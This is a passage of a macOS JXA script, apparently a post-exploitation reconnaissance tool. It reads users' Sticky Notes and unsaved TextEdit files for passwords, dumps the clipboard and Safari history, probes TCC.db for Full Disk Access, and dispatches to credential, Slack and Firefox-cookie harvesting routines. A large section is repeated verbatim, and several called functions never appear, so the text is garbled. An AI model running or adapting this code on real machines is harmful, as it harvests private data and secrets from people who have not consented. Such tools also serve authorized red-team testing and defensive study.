        result += `Error in NSTask method: ${error}\n`;
    }
    return result;
}

function LockCheck(){
    var results = "";
    try {
        var script = `
        #!/bin/bash
        p=$(ioreg -n Root -d1 -a | grep CGSSession)
        if [[ "$p" == *"CGSSessionScreenIsLocked"* ]]; then
            echo "[+] Screen is currently LOCKED"
        else
            echo "[-] Screen is currently UNLOCKED"
        fi`
        var p = currentApp.doShellScript(script);
        results += p;
    } catch (error){
        results += error;
    }
    results += "\n#######################################\n";
    return results;
}

function StickyNotes(){
    var results = "";
    var username = $.NSUserName().js
    var stickiespath = '/Users/' + username + '/Library/Containers/com.apple.Stickies/Data/Library/Stickies/';
    results += "=====> Checking for Sticky Notes:\n";
    if (fileMan.fileExistsAtPath(stickiespath)){
        let sticky_files = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(stickiespath,$()));
        if (sticky_files.length > 1){ // This accounts for .SavedStickiesState (the sticky plist)
            results += "\n[+] Sticky Files Found:\n";
            results += sticky_files + "\n\n";
            results += "[~] If a password is the last item in a sticky note, it will end with a '}', this is for the content of the sticky note and not a part of the password.\n\n"
            results += "Sticky File Contents: \n";
            results += "=============================\n\n";
            try{
                for (p=0; p< sticky_files.length; p++){
                    if (sticky_files[p].includes('DS_Store') || sticky_files[p].includes('SavedStickiesState')){
                        continue;
                    }
                    var changeto = stickiespath + sticky_files[p];
                    let rtf_files = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(changeto,$()));
                    results += "RTF FILES FOUND: " + rtf_files + "\n";
                    for (q=0; q< rtf_files.length; q++){
                        var rtfFilePath = changeto + "/" + rtf_files[q]
                        if (rtfFilePath.includes('TXT.rtf')){
                            var contents = $.NSString.stringWithContentsOfFileEncodingError(rtfFilePath,$.NSNEXTSTEPStringEncoding, $()).js;
                            results += "Contents of: \n" + rtfFilePath + "\n";
                            results += "---------------------------------------------------------------\n\n"
                            results += contents;
                            results += "\n---------------------------------------------------------------\n"
                        }
                        else {
                            results += "\nNon-RTF file found: \n======================\n" + changeto + "/" + rtf_files[q] + "\n\n";
                            results += "[!] Review this file manually\n\n======================\n\n\n";
                        }
                    }
                }
            }
            catch(err){
                results += err;
                results += "\n";
            }
        }
        else {
            results += "No Sticky Notes found on the system.\n\n"
        }
    }
    results += "#######################################\n";
    return results;
}

function TextEditCheck(){
    var results = "";
    var username = $.NSUserName().js;
    var path = "/Users/" + username + "/Library/Containers/com.apple.TextEdit/Data/Library/Autosave Information";
    var tcanary = 0;
    if (fileMan.fileExistsAtPath(path)){
        results += "\nTextEdit autosave temp dir found...checking for unsaved TextEdit documents...\n";
        try {
            var dirContents = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(path,$()));
            if (dirContents.length > 1){
                for (p=0; p<dirContents.length; p++){
                    if (dirContents[p].endsWith(".rtf")){
                        tcanary += 1;
                        var contents = $.NSString.stringWithContentsOfFileEncodingError(path + "/" + dirContents[p],$.NSNEXTSTEPStringEncoding, $()).js;
                        results += "\nUnsaved TextEdit file contents:\n";
                        results += contents
                        results += "\n\n";
                    }
                }
            }
            if (tcanary == 0){
                results += "\n";
                results += "[-] No unsaved TextEdit documents found...\n";
            }
        }
        catch(err){
            results += "\n";
            results += err;
            results += "\n";
        }
    }
    return results;
}

// TODO: If FDA, set FDA constant to 'true' and push it to mem so it canbe read by other functions. 

function TCCCheck(){
    var results = "";
    results += "#######################################\n";
    results += "Full Disk Access Check\n";
    var username = $.NSUserName().js
    try{
        var dbpath = '/Users/' + username + '/Library/Application\\ Support/com.apple.TCC/TCC.db'
        var handle = $.NSFileHandle.fileHandleForReadingAtPath(dbpath);
        var size = handle.seekToEndOfFile;
        var conv = this.toString(size);
        if (size == null){
            results += '[-] Your current app context has NOT yet been given FDA\n';
        }
        else {
            results += '[+] Your current app context HAS ALREADY been given FDA! Size of the user TCC.db file is ' + size + '\n';
        }
    }
    catch(error){
        results += error + '\n';
    }
    results += "#######################################\n";
    return results;
}

// TODO: Basic key extraction, generic. Needs improvement
function LaunchAgents() {
    var results = "";
    results += "=====>Launch Agents and Daemons:\n";
    
    var dir = {
        "LaunchAgents": [
            "/Library/LaunchAgents",
            "/System/Library/LaunchAgents",
            $.NSHomeDirectory() + "/Library/LaunchAgents"
        ],
        "LaunchDaemons": [
            "/Library/LaunchDaemons",
            "/System/Library/LaunchDaemons"
        ]
    };
    
    for (var type in dir) {
        results += `\n${type}:\n`;
        dir[type].forEach(path => {
            if (checkPOSIXAccess(path, 'r')) {
                results += `\nContents of ${path}:\n`;
                var items = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(path, $()));
                items.forEach(item => {
                    if (item.endsWith('.plist')) {
                        var fullPath = path + '/' + item;
                        var plistContents = $.NSString.stringWithContentsOfFileEncodingError(fullPath, $.NSUTF8StringEncoding, $());
                        results += `  ${item}:\n`;
                        if (plistContents && plistContents.js) {
                            if (plistContents.js.includes('<key>ProgramArguments</key>')) {
                                var match = plistContents.js.match(/<key>ProgramArguments<\/key>[\s\S]*?<array>([\s\S]*?)<\/array>/);
                                if (match) {
                                    results += `    \nProgram: ${match[1].trim().split('<string>').pop().split('</string>')[0]}\n`;
                                }
                            }
                            if (plistContents.js.includes('<key>RunAtLoad</key>')) {
                                results += `    Runs at Load: Yes\n`;
                            }
                            if (plistContents.js.includes('<key>KeepAlive</key>')) {
                                results += `    Keeps Alive: Yes\n`;
                            }
                        } else {
                            results += `    Unable to read plist contents\n`;
                        }
                    }
                });
            } else {
                results += `\nUnable to read ${path}\n`;
            }
        });
    }
    
    results += "#######################################\n";
    return results;
}


function SystemInfo() {
    var results = "";
    results += "=====>System Information:\n";
    
    // Hardware info
    var hardwareInfo = $.NSString.stringWithString('system_profiler SPHardwareDataType').stringByAppendingSubstitution;
    results += hardwareInfo + "\n";
    
    // Software info
    var softwareInfo = $.NSString.stringWithString('system_profiler SPSoftwareDataType').stringByAppendingSubstitution;
    results += softwareInfo + "\n";
    
    results += "#######################################\n";
    return results;
}

function Clipboard() {
    var results = "";
    results += "=====>Clipboard Contents:\n";
    
    var clipboard = $.NSPasteboard.generalPasteboard;
    var contents = ObjC.unwrap(clipboard.stringForType('public.utf8-plain-text'));
    
    results += contents ? contents : "No text content in clipboard";
    results += "\n#######################################\n";
    return results;
}

function ListUsers() {
    var results = "";
    results += "=====>Local User Accounts:\n";
    
    var users = $.NSString.stringWithString('dscl . list /Users').stringByAppendingSubstitution;
    results += users;
    
    results += "\n#######################################\n";
    return results;
}

function debugLog(message) {
    if (DEBUG) {
        console.log(`[DEBUG] ${message}`);
    }
}

function checkAppSecurity(appPath) {
    var results = "";
    
    // Check permissions
    var canRead = checkPOSIXAccess(appPath, 'r');
    var canWrite = checkPOSIXAccess(appPath, 'w');
    var canExecute = checkPOSIXAccess(appPath, 'x');
    results += `    Permissions: ${canRead ? 'R' : '-'}${canWrite ? 'W' : '-'}${canExecute ? 'X' : '-'}\n`;
    
    if (canWrite) {
        results += "    [!] Application is writable, potential security risk\n";
    }
    
    // Check bundle structure
    try {
        var bundleContents = fileMan.contentsOfDirectoryAtPathError(appPath + "/Contents", null);
        if (bundleContents) {
            var writableComponents = [];
            for (var i = 0; i < bundleContents.count; i++) {
                var item = ObjC.unwrap(bundleContents.objectAtIndex(i));
                if (checkPOSIXAccess(appPath + "/Contents/" + item, 'w')) {
                    writableComponents.push(item);
                }
            }
            if (writableComponents.length > 0) {
                results += "    [!] Writable components found: " + writableComponents.join(", ") + "\n";
            }
        }
    } catch (error) {
        results += `    Error checking bundle structure: ${error}\n`;
    }
    
    // Check code signing for the app
    results += checkCodeSigningAPI(appPath);
    
    // Check for associated launch agents/daemons and their code signing
    var appName = appPath.split("/").pop().split(".app")[0];
    var launchAgentsPaths = [
        "/Library/LaunchAgents",
        "/Library/LaunchDaemons",
        $.NSHomeDirectory() + "/Library/LaunchAgents"
    ];
    launchAgentsPaths.forEach(function(path) {
        try {
            var agents = fileMan.contentsOfDirectoryAtPathError(path, null);
            if (agents) {
                for (var i = 0; i < agents.count; i++) {
                    var agent = ObjC.unwrap(agents.objectAtIndex(i));
                    if (agent.toLowerCase().includes(appName.toLowerCase())) {
                        var agentPath = path + "/" + agent;
                        results += `    Associated launch agent/daemon found: ${agentPath}\n`;
                        results += checkCodeSigningAPI(agentPath);
                    }
                }
            }
        } catch (error) {
            results += `    Error checking launch agents in ${path}: ${error}\n`;
        }
    });
    
    return results;
}
function checkCodeSigningAPI(path) {
    let results = "";
    
    try {
        ObjC.import('Security');
        
        const url = $.NSURL.fileURLWithPath(path);
        const staticCode = Ref();
        const error = Ref();
        
        let status = $.SecStaticCodeCreateWithPath(url, 0, staticCode);
        if (status !== 0) {
            return `Error creating static code object for ${path}: ${CSSM_ERROR_CODES[status.toString()] || status}\n`;
        }
        
        const signingInformation = Ref();
        status = $.SecStaticCodeCheckValidityWithErrors(staticCode[0], $.kSecCSDefaultFlags, null, error);
        
        results += `Code signing information for ${path}:\n`;
        
        if (status === 0) {
            status = $.SecCodeCopySigningInformation(staticCode[0], $.kSecCSSigningInformation, signingInformation);
            if (status === 0) {
                const info = ObjC.deepUnwrap(signingInformation[0]);
                results += "Signature is valid\n";
                
                if (DEBUG) {
                    results += `Team Identifier: ${info.teamIdentifier || 'N/A'}\n`;
                    results += `Signing Identity: ${info.signingIdentity || 'N/A'}\n`;
                    // Add more fields as needed
                }
            }
        } else {
            const errorMessage = CSSM_ERROR_CODES[status.toString()] || `Unknown error (Status: ${status})`;
            results += `[!] ${errorMessage}\n`;
        }
    } catch (error) {
        results += `Error checking code signing: ${error}\n`;
    }
    
    return results;
}


// Function: checkAppCodeSigning
// Purpose: Check code signing for a single application
// Input: path - The full path to the .app bundle
// Output: A string with code signing information for the app
// Usage: Can be called directly or used by checkAllAppsCodeSigning
function checkAppCodeSigning(path) {
    debugLog(`Checking code signing for: ${path}`);
    var signingInfo = checkCodeSigningAPI(path);
    debugLog(`Finished checking code signing for: ${path}`);
    return signingInfo;
}

// Function: checkAllAppsCodeSigning
// Purpose: Check code signing for all applications in the /Applications directory
// Behavior: 
// - Iterates through all .app bundles in /Applications
// - Calls checkAppCodeSigning for each application
// - Returns a string with code signing information for all apps
// - Does not filter results based on DEBUG flag (always shows all info)
// Usage: Called when the -codesign flag is used
function checkAllAppsCodeSigning() {
    debugLog("Starting checkAllAppsCodeSigning");
    let results = "";
    const applicationsPath = "/Applications";
    
    try {
        debugLog(`Reading contents of ${applicationsPath}`);
        const apps = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(applicationsPath, $()));
        debugLog(`Found ${apps.length} items in ${applicationsPath}`);
        
        apps.forEach(app => {
            if (app.endsWith(".app")) {
                const fullPath = applicationsPath + "/" + app;
                debugLog(`Checking app: ${fullPath}`);
                const signingInfo = checkCodeSigningAPI(fullPath);
                
                if (signingInfo.includes("[!]") || DEBUG) {
                    results += signingInfo + "\n";
                }
                
                debugLog(`Finished checking app: ${fullPath}`);
            }
        });
    } catch (error) {
        debugLog(`Error in checkAllAppsCodeSigning: ${error}`);
        results += `Error checking applications: ${error}\n`;
    }
    
    debugLog("Finished checkAllAppsCodeSigning");
    return results || "All applications are properly signed.\n";
}

// TODO:  the longest active assumption of my life  :) 
function checkTCCPermissions() {
    // Check if we have necessary TCC permissions
    // This is a placeholder and would need to be implemented based on macOS version and specific requirements
    return true; // Assume we have permissions for now
}



function SafariHistory() {
    debugLog("Starting Safari history retrieval");
    var results = "Safari History:\n";

    var safariDataPath = $.NSHomeDirectory().stringByAppendingPathComponent("Library/Containers/com.apple.Safari/Data/Library/Safari");
    var historyDbPath = safariDataPath.stringByAppendingPathComponent("History.db");

    if ($.NSFileManager.defaultManager.fileExistsAtPath(historyDbPath)) {
        debugLog("Safari history database found");
        try {
            ObjC.import('sqlite3');
            var db = Ref();
            var rc = $.sqlite3_open(historyDbPath, db);
            if (rc === $.SQLITE_OK) {
                debugLog("Successfully opened Safari history database");
                var stmt = Ref();
                var sql = "SELECT visit_time, url FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id ORDER BY visit_time DESC LIMIT 50;";
                rc = $.sqlite3_prepare_v2(db[0], sql, -1, stmt, null);
                if (rc === $.SQLITE_OK) {
                    var count = 0;
                    while ($.sqlite3_step(stmt[0]) === $.SQLITE_ROW) {
                        var visitTime = $.sqlite3_column_int64(stmt[0], 0);
                        var url = $.sqlite3_column_text(stmt[0], 1);
                        var date = new Date(visitTime * 1000); // Convert Unix timestamp to JS Date
                        results += `${date.toISOString()} - ${ObjC.unwrap(url)}\n`;
                        count++;
                    }
                    debugLog(`Retrieved ${count} Safari history entries`);
                } else {
                    results += `Error preparing SQL statement: ${$.sqlite3_errmsg(db[0])}\n`;
                }
                $.sqlite3_finalize(stmt[0]);
            } else {
                results += `Error opening Safari history database: ${$.sqlite3_errmsg(db[0])}\n`;
            }
            $.sqlite3_close(db[0]);
        } catch (error) {
            results += `Error reading Safari history: ${error}\n`;
            debugLog(`Error in Safari history retrieval: ${error}`);
        }
    } else {
        results += "Safari history database not found.\n";
        debugLog("Safari history database not found");
    }

    // Optionally, you can add checks for other files like LastSession.plist, TopSites.plist, etc.

    debugLog("Finished Safari history retrieval");
    return results;
}


function safaridbs() {
    debugLog("Starting Safari database retrieval");
    var results = "Safari Databases:\n";

    var safariDataPath = ObjC.unwrap($.NSHomeDirectory().stringByAppendingPathComponent("/Library/Safari/History.db"));
    debugLog(`Checking Safari SafariTabs database: ${safariDataPath}`);

    if ($.NSFileManager.defaultManager.fileExistsAtPath(safariDataPath)) {
        results += `Database: SafariTabs.db\n`;

        try {
            // Use NSTask to run sqlite3 command
            // FYI: We use NSTask to run sqlite3 
            // and is also a trusted service
            // ObjC:(sqlite3) lib does not and depends on the parent PID 

            var task = $.NSTask.alloc.init;
            task.executableURL = $.NSURL.fileURLWithPath("/usr/bin/sqlite3");
            task.arguments = [safariDataPath, ".tables"];

            var pipe = $.NSPipe.pipe;
            task.standardOutput = pipe;

            task.launch;
            task.waitUntilExit;

            var data = pipe.fileHandleForReading.readDataToEndOfFile;
            var tables = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

            results += "Tables:\n" + tables + "\n";

            // Query each table structure
            tables.split(/\s+/).forEach(function(table) {
                if (table.trim()) {
                    task = $.NSTask.alloc.init;
                    task.executableURL = $.NSURL.fileURLWithPath("/usr/bin/sqlite3");
                    task.arguments = [safariDataPath, `PRAGMA table_info(${table.trim()});`];

                    pipe = $.NSPipe.pipe;
                    task.standardOutput = pipe;

                    task.launch;
                    task.waitUntilExit;

                    data = pipe.fileHandleForReading.readDataToEndOfFile;
                    var structure = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

                    results += `\nStructure of ${table.trim()}:\n${structure}\n`;
                }
            });
        } catch (error) {
            results += `Error processing SafariTabs database: ${error}\n`;
            debugLog(`Error in SafariTabs database retrieval: ${error}`);
        }
    } else {
        results += `SafariTabs database not found.\n`;
        debugLog(`SafariTabs database not found`);
    }

    debugLog("Finished Safari database retrieval");
    return results;
}

function parseArguments() {
    const args = $.NSProcessInfo.processInfo.arguments;
    const parsedArgs = {};
    for (let i = 4; i < args.count; i++) {
        const arg = ObjC.unwrap(args.objectAtIndex(i));
        if (arg.startsWith("-")) {
            const key = arg.substring(1);
            parsedArgs[key] = true;
        }
    }
    return parsedArgs;
}

function main() {
    const args = parseArguments();
    
    if (Object.keys(args).length === 0 || args.help) {
        printHelp();
        return;
    }

    if (args.debug) {
        DEBUG = true;
        console.log("Debug mode enabled");
    }

    let result = "";
    Object.keys(args).forEach(arg => {
        switch(arg) {
            case 'tcc':
                result += TCCCheck();
                break;
            case 'securitytools':
                result += SecurityToolsCheck();
                break;
            case 'sysinfo':
                result += SysInfo();
                break;
            case 'clipboard':
                result += Clipboard();
                break;
            case 'running':
                result += RunningApps();
                break;
            case 'listusers':
                result += ListUsers();
                break;
            case 'launchagents':
                result += LaunchAgents();
                break;
            case 'history':
                result += History();
                break;
            case 'slack':
                result += SlackSearch();
                break;
            case 'installed':
                result += InstalledApps();
                break;
            case 'firefox':
                result += FirefoxCookies();
                break;
            case 'lock':
                result += LockCheck();
                break;
            case 'sticky':
                result += StickyNotes();
                break;
            case 'textedit':
                result += TextEditCheck();
                break;
            case 'cred':
                result += CredSearch();
                break;
            case 'codesign':
                result += checkAllAppsCodeSigning();
                break;
            case 'safarihistory':
                result += SafariHistory();
                break;
            case 'safaridbs':
                result += safaridbs();
                break;
            case 'all':
                result += TCCCheck();
                result += SecurityToolsCheck();
                result += SysInfo();
                result += Clipboard();
                result += RunningApps();
                result += ListUsers();
                result += LaunchAgents();
                result += History();
                result += SlackSearch();
                result += InstalledApps();
                result += FirefoxCookies();
                result += LockCheck();
                result += StickyNotes();
                result += TextEditCheck();
                result += CredSearch();
                result += SafariHistory();
                result += safaridbs();
                break;
        }
    });

    console.log(result);
}

// Function to determine if the script is being run directly
function isRunningDirectly() {
    ObjC.import('Foundation');
    const mainBundle = $.NSBundle.mainBundle;
    const isRunningInOSAX = mainBundle.bundleIdentifier.js === "com.apple.ScriptEditor.id.swiftbelt";
    const isRunningFromCommandLine = $.NSProcessInfo.processInfo.processName.js === "osascript";
    return isRunningInOSAX || isRunningFromCommandLine;
}

// Check if the script is being run directly or imported as a module
if (isRunningDirectly()) {
    main();
} else {
    // Export functions for import when used as a module
    this.Discover = Discover;
    this.TCCCheck = TCCCheck;
    this.SecurityToolsCheck = SecurityToolsCheck;
    this.SysInfo = SysInfo;
    // ... (export other functions as needed)
}

function checkCodeSigningAPI(path) {
    let results = "";
    
    try {
        ObjC.import('Security');
        
        const url = $.NSURL.fileURLWithPath(path);
        const staticCode = Ref();
        const error = Ref();
        
        let status = $.SecStaticCodeCreateWithPath(url, 0, staticCode);
        if (status !== 0) {
            return `Error creating static code object for ${path}: ${CSSM_ERROR_CODES[status.toString()] || status}\n`;
        }
        
        const signingInformation = Ref();
        status = $.SecStaticCodeCheckValidityWithErrors(staticCode[0], $.kSecCSDefaultFlags, null, error);
        
        results += `Code signing information for ${path}:\n`;
        
        if (status === 0) {
            status = $.SecCodeCopySigningInformation(staticCode[0], $.kSecCSSigningInformation, signingInformation);
            if (status === 0) {
                const info = ObjC.deepUnwrap(signingInformation[0]);
                results += "Signature is valid\n";
                
                if (DEBUG) {
                    results += `Team Identifier: ${info.teamIdentifier || 'N/A'}\n`;
                    results += `Signing Identity: ${info.signingIdentity || 'N/A'}\n`;
                    // Add more fields as needed
                }
            }
        } else {
            const errorMessage = CSSM_ERROR_CODES[status.toString()] || `Unknown error (Status: ${status})`;
            results += `[!] ${errorMessage}\n`;
        }
    } catch (error) {
        results += `Error checking code signing: ${error}\n`;
    }
    
    return results;
}


// Function: checkAppCodeSigning
// Purpose: Check code signing for a single application
// Input: path - The full path to the .app bundle
// Output: A string with code signing information for the app
// Usage: Can be called directly or used by checkAllAppsCodeSigning
function checkAppCodeSigning(path) {
    debugLog(`Checking code signing for: ${path}`);
    var signingInfo = checkCodeSigningAPI(path);
    debugLog(`Finished checking code signing for: ${path}`);
    return signingInfo;
}

// Function: checkAllAppsCodeSigning
// Purpose: Check code signing for all applications in the /Applications directory
// Behavior: 
// - Iterates through all .app bundles in /Applications
// - Calls checkAppCodeSigning for each application
// - Returns a string with code signing information for all apps
// - Does not filter results based on DEBUG flag (always shows all info)
// Usage: Called when the -codesign flag is used
function checkAllAppsCodeSigning() {
    debugLog("Starting checkAllAppsCodeSigning");
    let results = "";
    const applicationsPath = "/Applications";
    
    try {
        debugLog(`Reading contents of ${applicationsPath}`);
        const apps = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(applicationsPath, $()));
        debugLog(`Found ${apps.length} items in ${applicationsPath}`);
        
        apps.forEach(app => {
            if (app.endsWith(".app")) {
                const fullPath = applicationsPath + "/" + app;
                debugLog(`Checking app: ${fullPath}`);
                const signingInfo = checkCodeSigningAPI(fullPath);
                
                if (signingInfo.includes("[!]") || DEBUG) {
                    results += signingInfo + "\n";
                }
                
                debugLog(`Finished checking app: ${fullPath}`);
            }
        });
    } catch (error) {
        debugLog(`Error in checkAllAppsCodeSigning: ${error}`);
        results += `Error checking applications: ${error}\n`;
    }
    
    debugLog("Finished checkAllAppsCodeSigning");
    return results || "All applications are properly signed.\n";
}

// TODO:  the longest active assumption of my life  :) 
function checkTCCPermissions() {
    // Check if we have necessary TCC permissions
    // This is a placeholder and would need to be implemented based on macOS version and specific requirements
    return true; // Assume we have permissions for now
}



function SafariHistory() {
    debugLog("Starting Safari history retrieval");
    var results = "Safari History:\n";

    var safariDataPath = $.NSHomeDirectory().stringByAppendingPathComponent("Library/Containers/com.apple.Safari/Data/Library/Safari");
    var historyDbPath = safariDataPath.stringByAppendingPathComponent("History.db");

    if ($.NSFileManager.defaultManager.fileExistsAtPath(historyDbPath)) {
        debugLog("Safari history database found");
        try {
            ObjC.import('sqlite3');
            var db = Ref();
            var rc = $.sqlite3_open(historyDbPath, db);
            if (rc === $.SQLITE_OK) {
                debugLog("Successfully opened Safari history database");
                var stmt = Ref();
                var sql = "SELECT visit_time, url FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id ORDER BY visit_time DESC LIMIT 50;";
                rc = $.sqlite3_prepare_v2(db[0], sql, -1, stmt, null);
                if (rc === $.SQLITE_OK) {
                    var count = 0;
                    while ($.sqlite3_step(stmt[0]) === $.SQLITE_ROW) {
                        var visitTime = $.sqlite3_column_int64(stmt[0], 0);
                        var url = $.sqlite3_column_text(stmt[0], 1);
                        var date = new Date(visitTime * 1000); // Convert Unix timestamp to JS Date
                        results += `${date.toISOString()} - ${ObjC.unwrap(url)}\n`;
                        count++;
                    }
                    debugLog(`Retrieved ${count} Safari history entries`);
                } else {
                    results += `Error preparing SQL statement: ${$.sqlite3_errmsg(db[0])}\n`;
                }
                $.sqlite3_finalize(stmt[0]);
            } else {
                results += `Error opening Safari history database: ${$.sqlite3_errmsg(db[0])}\n`;
            }
            $.sqlite3_close(db[0]);
        } catch (error) {
            results += `Error reading Safari history: ${error}\n`;
            debugLog(`Error in Safari history retrieval: ${error}`);
        }
    } else {
        results += "Safari history database not found.\n";
        debugLog("Safari history database not found");
    }

    // Optionally, you can add checks for other files like LastSession.plist, TopSites.plist, etc.

    debugLog("Finished Safari history retrieval");
    return results;
}


function safaridbs() {
    debugLog("Starting Safari database retrieval");
    var results = "Safari Databases:\n";

    var safariDataPath = ObjC.unwrap($.NSHomeDirectory().stringByAppendingPathComponent("/Library/Safari/History.db"));
    debugLog(`Checking Safari SafariTabs database: ${safariDataPath}`);

    if ($.NSFileManager.defaultManager.fileExistsAtPath(safariDataPath)) {
        results += `Database: SafariTabs.db\n`;

        try {
            // Use NSTask to run sqlite3 command
            // FYI: We use NSTask to run sqlite3 
            // and is also a trusted service
            // ObjC:(sqlite3) lib does not and depends on the parent PID 

            var task = $.NSTask.alloc.init;
            task.executableURL = $.NSURL.fileURLWithPath("/usr/bin/sqlite3");
            task.arguments = [safariDataPath, ".tables"];

            var pipe = $.NSPipe.pipe;
            task.standardOutput = pipe;

            task.launch;
            task.waitUntilExit;

            var data = pipe.fileHandleForReading.readDataToEndOfFile;
            var tables = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

            results += "Tables:\n" + tables + "\n";

            // Query each table structure
            tables.split(/\s+/).forEach(function(table) {
                if (table.trim()) {
                    task = $.NSTask.alloc.init;
                    task.executableURL = $.NSURL.fileURLWithPath("/usr/bin/sqlite3");
                    task.arguments = [safariDataPath, `PRAGMA table_info(${table.trim()});`];

                    pipe = $.NSPipe.pipe;
                    task.standardOutput = pipe;

                    task.launch;
                    task.waitUntilExit;

                    data = pipe.fileHandleForReading.readDataToEndOfFile;
                    var structure = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

                    results += `\nStructure of ${table.trim()}:\n${structure}\n`;
                }
            });
        } catch (error) {
            results += `Error processing SafariTabs database: ${error}\n`;
            debugLog(`Error in SafariTabs database retrieval: ${error}`);
        }
    } else {
        results += `SafariTabs database not found.\n`;
        debugLog(`SafariTabs database not found`);
    }

    debugLog("Finished Safari database retrieval");
    return results;
}

function parseArguments() {
    const args = $.NSProcessInfo.processInfo.arguments;
    const parsedArgs = {};
    for (let i = 4; i < args.count; i++) {
        const arg = ObjC.unwrap(args.objectAtIndex(i));
        if (arg.startsWith("-")) {
            const key = arg.substring(1);
            parsedArgs[key] = true;
        }
    }
    return parsedArgs;
}

function main() {
    const args = parseArguments();
    
    if (Object.keys(args).length === 0 || args.help) {
        printHelp();
        return;
    }

    if (args.debug) {
        DEBUG = true;
        console.log("Debug mode enabled");
    }

    let result = "";
    Object.keys(args).forEach(arg => {
        switch(arg) {
            case 'tcc':
                result += TCCCheck();
                break;
            case 'securitytools':
                result += SecurityToolsCheck();
                break;
            case 'sysinfo':
                result += SysInfo();
                break;
            case 'clipboard':
                result += Clipboard();
                break;
            case 'running':
                result += RunningApps();
                break;
            case 'listusers':
                result += ListUsers();
                break;
            case 'launchagents':
                result += LaunchAgents();
                break;
            case 'history':
                result += History();
                break;
            case 'slack':
                result += SlackSearch();
                break;
            case 'installed':
                result += InstalledApps();
                break;
            case 'firefox':
                result += FirefoxCookies();
                break;
            case 'lock':
                result += LockCheck();
                break;
            case 'sticky':
                result += StickyNotes();
                break;
            case 'textedit':
                result += TextEditCheck();
                break;
            case 'cred':
                result += CredSearch();
                break;
            case 'codesign':
                result += checkAllAppsCodeSigning();
                break;
            case 'safarihistory':
                result += SafariHistory();
                break;
            case 'safaridbs':
                result += safaridbs();
                break;
            case 'all':
                result += TCCCheck();
                result += SecurityToolsCheck();
                result += SysInfo();
                result += Clipboard();
                result += RunningApps();
                result += ListUsers();
                result += LaunchAgents();
                result += History();
                result += SlackSearch();
                result += InstalledApps();
                result += FirefoxCookies();
                result += LockCheck();
                result += StickyNotes();
                result += TextEditCheck();
                result += CredSearch();
                result += SafariHistory();
                result += safaridbs();
                break;
        }
    });

    console.log(result);
}

// Function to determine if the script is being run directly
function isRunningDirectly() {
    ObjC.import('Foundation');
    const mainBundle = $.NSBundle.mainBundle;
    const isRunningInOSAX = mainBundle.bundleIdentifier.js === "com.apple.ScriptEditor.id.swiftbelt";
    const isRunningFromCommandLine = $.NSProcessInfo.processInfo.processName.js === "osascript";
    return isRunningInOSAX || isRunningFromCommandLine;
}

// Check if the script is being run directly or imported as a module
if (isRunningDirectly()) {
    main();
} else {
    // Export functions for import when used as a module
    this.Discover = Discover;
    this.TCCCheck = TCCCheck;
    this.SecurityToolsCheck = SecurityToolsCheck;
    this.SysInfo = SysInfo;
    // ... (export other functions as needed)
}